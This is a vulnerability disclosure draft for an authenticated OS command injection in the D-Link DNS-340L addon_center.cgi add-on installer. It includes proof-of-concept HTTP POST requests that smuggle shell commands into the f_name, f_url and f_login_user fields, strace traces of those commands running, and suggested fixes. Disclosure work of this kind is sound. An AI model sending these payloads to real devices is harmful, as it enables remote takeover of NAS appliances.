# Vulnerability Submission: D-Link DNS-340L addon_center.cgi OS Command Injection

## Basic Information

| Field | Value |
|-------|-------|
| VulnDB ID | Pending assignment |
| CVE ID | Pending assignment |
| CWE ID | CWE-78 |
| CVSS v3.1 Score | 8.8 |
| CVSS v3.1 Vector | AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H |
| Vulnerability Type | OS Command Injection |
| Internal ID | DLINK-CMD-007 |

## Affected Product

| Field | Value |
|-------|-------|
| Vendor | D-Link |
| Product | DNS-340L ShareCenter |
| Confirmed Firmware Versions | DNS-340L REVA 1.01B04 |
| Related Runtime Evidence | DNS-320L REVA 1.10B03 and DNS-327L REVA 1.10B02 also propagate attacker-controlled values into add-on download execution paths, but this draft's primary shell-injection claim is limited to the directly observed DNS-340L `/bin/sh -c` template. |
| Affected Binary | cgi/addon_center.cgi |
| Web Endpoint | /cgi-bin/addon_center.cgi |
| Architecture | ARM EABI5 little-endian |
| Confirmed Binary SHA1 | DNS-340L 1.01B04: c6003545359d04ab01f16cdc5e618ca634a6c8f1 |

## Description

The `addon_center.cgi` CGI handler implements add-on package management. The authenticated add-on installation branch accepts HTTP POST parameters including `f_name`, `f_url`, `f_flag`, and `f_login_user` for `cmd=download_install_addon`.

In DNS-340L REVA 1.01B04, the handler builds a shell command resembling:

```text
download_apkg <f_name> '<f_url>' <f_flag> <f_login_user> > /dev/null &
```

and executes it through `/bin/sh -c`. The `f_name` and `f_login_user` parameters are inserted outside shell quotes, and a single quote in `f_url` can break out of the quoted URL argument. An authenticated web attacker can inject shell metacharacters into these parameters and execute arbitrary commands as the CGI process user.

The vulnerable path is reachable from the authenticated Add-On Center UI. `web/pages/function/addon.js` sends POST requests to `/cgi-bin/addon_center.cgi` with:

```text
cmd=download_install_addon&f_name=<module>&f_url=<download_url>&f_flag=<flag>&f_login_user=<user>
```

## Impact

Successful exploitation allows authenticated remote command execution on the NAS appliance through the Add-On Center package-install workflow. The attacker can run arbitrary shell commands, alter device configuration, install or remove files, or disrupt NAS services.

This report is limited to the `download_install_addon` parameter-to-shell paths confirmed with marker files and qemu strace. `clear_addon_files`, `cgi_download_apkg_finish`, and `uninstall_addon` branches were also tested; they are not claimed here because they did not create marker files in the focused verification.

## Proof of Concept

Low-impact marker examples:

```http
POST /cgi-bin/addon_center.cgi HTTP/1.1
Host: <TARGET>
Content-Type: application/x-www-form-urlencoded

cmd=download_install_addon&f_name=PhotoCenter;touch /tmp/DLINK_CMD_007_name.hit;#&f_url=http://127.0.0.1/addon.pkg&f_flag=1&f_login_user=admin
```

```http
POST /cgi-bin/addon_center.cgi HTTP/1.1
Host: <TARGET>
Content-Type: application/x-www-form-urlencoded

cmd=download_install_addon&f_name=PhotoCenter&f_url=http://127.0.0.1/addon.pkg';touch /tmp/DLINK_CMD_007_url.hit;#&f_flag=1&f_login_user=admin
```

```http
POST /cgi-bin/addon_center.cgi HTTP/1.1
Host: <TARGET>
Content-Type: application/x-www-form-urlencoded

cmd=download_install_addon&f_name=PhotoCenter&f_url=http://127.0.0.1/addon.pkg&f_flag=1&f_login_user=admin;touch /tmp/DLINK_CMD_007_user.hit;#
```

## Runtime Evidence

Focused verification artifacts:

- `scripts/oneoff/verify_addon_center_branch_params_20260526.py`
- `inout/reports/0day_verification_20260526/addon_center_branch_params_runtime_20260526.json`
- `inout/reports/0day_verification_20260526/addon_center_branch_params_triage_20260526.md`
- `inout/reports/0day_verification_20260526/addon_center_duplicate_check_20260526.json`
- `inout/reports/0day_verification_20260526/addon_center_duplicate_check_20260526.md`

Runtime summary:

| Firmware | Binary SHA1 | Marker hits | Controlled exec traces |
|----------|-------------|-------------|-------------------------|
| DNS-320L 1.10B03 | 4d03396f1aba2a78c7338cfc260167c65c78e198 | 3 | 6 |
| DNS-327L 1.10B02 | 30723faa93891b449c6fe06a5b39c2a9443aa3b0 | 3 | 6 |
| DNS-340L 1.01B04 | c6003545359d04ab01f16cdc5e618ca634a6c8f1 | 4 | 6 |

Representative DNS-340L qemu strace evidence:

`f_name` semicolon injection:

```text
execve("/bin/sh",{"sh","-c","download_apkg PhotoCenter;touch /tmp/FIRMREC_DNS340L_101B04_ADDON_CENTER_20260526_download_name.hit;# 'http://127.0.0.1/addon.pkg' 1 admin > /dev/null &",NULL})
```

`f_url` quote breakout:

```text
execve("/bin/sh",{"sh","-c","download_apkg PhotoCenter 'http://127.0.0.1/addon.pkg';touch /tmp/FIRMREC_DNS340L_101B04_ADDON_CENTER_20260526_download_url_quote.hit;#' 1 admin > /dev/null &",NULL})
```

`f_login_user` semicolon injection:

```text
execve("/bin/sh",{"sh","-c","download_apkg PhotoCenter 'http://127.0.0.1/addon.pkg' 1 admin;touch /tmp/FIRMREC_DNS340L_101B04_ADDON_CENTER_20260526_download_user.hit;# > /dev/null &",NULL})
```

The verifier created marker files in temporary qemu sysroots for these DNS-340L cases.

## Public Duplicate Check

Public duplicate checks on 2026-05-26 did not find a directly matching public CVE or disclosure for D-Link `addon_center.cgi` command injection through `download_install_addon`, `f_name`, `f_url`, or `f_login_user`.

NVD API checks:

| Query | Result |
|-------|--------|
| `addon_center.cgi` | 0 CVE records |
| `D-Link addon_center.cgi command injection` | 0 CVE records |
| `download_install_addon` | 0 CVE records |
| `download_apkg D-Link` | 0 CVE records |
| `DNS-340L addon_center.cgi` | 0 CVE records |
| `DNS-320L addon_center.cgi` | 0 CVE records |
| `DNS-327L addon_center.cgi` | 0 CVE records |

Manual web search terms also checked:

```text
"addon_center.cgi" "D-Link"
"addon_center.cgi" "CVE"
"addon_center.cgi" vulnerability
"download_install_addon" "D-Link"
"download_install_addon" "addon_center.cgi"
"download_apkg" "D-Link" vulnerability
"D-Link" "download_apkg" "command injection"
"DNS-340L" "addon_center.cgi"
"DNS-320L" "addon_center.cgi"
"DNS-327L" "addon_center.cgi"
```

Broader D-Link NAS command-injection searches return known same-family prior art for other endpoints. Those records are relevant prior art but are not direct duplicates of the verified `addon_center.cgi` / `download_install_addon` command path.

No search pass can prove global non-existence of private, vendor-only, paywalled, or poorly indexed reports. Repeat the duplicate check immediately before external filing.

## Discovery

| Field | Value |
|-------|-------|
| Discovery Method | FirmRec cross-firmware vulnerability mining plus branch-aware runtime verification |
| Date Verified | 2026-05-26 |
| Verification | Direct CGI POST probes in restored D-Link DNS rootfs images under qemu-arm-static with command markers |

## Suggested Fix

1. Replace shell-based command construction with argument-vector APIs such as `execve()` that do not invoke `/bin/sh`.
2. Treat add-on names, package URLs, flags, and usernames as structured values, not shell fragments.
3. Enforce strict server-side allowlists for add-on identifiers, URL schemes/hosts, numeric flags, and account names.
4. Reject shell metacharacters, command substitutions, quoting characters, separators, and malformed URL values before launching package-management actions.
5. Add server-side authorization and CSRF protections for add-on installation and removal actions.

## Disclosure Timeline

| Date | Event |
|------|-------|
| 2026-05-26 | Vulnerability verified with runtime marker evidence |
| TBD | Reported to D-Link PSIRT |
| TBD | CVE ID assigned |
| TBD | Public disclosure |
